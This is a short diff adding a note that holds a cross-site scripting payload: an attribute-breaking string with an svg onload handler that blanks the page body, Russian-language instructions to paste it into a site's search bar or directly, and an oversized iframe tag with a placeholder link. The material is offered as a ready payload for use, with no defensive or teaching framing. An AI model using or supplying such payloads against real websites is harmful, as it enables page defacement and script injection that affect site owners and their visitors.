@@ -1,0 +1,5 @@
+Payload:
+"><svg onload=alert(document.body.innerHTML="")//
+Вставлять в поисковую строку или на прямую
+
+<iframe src="линк" height="4000%" width="4000%"></iframe>
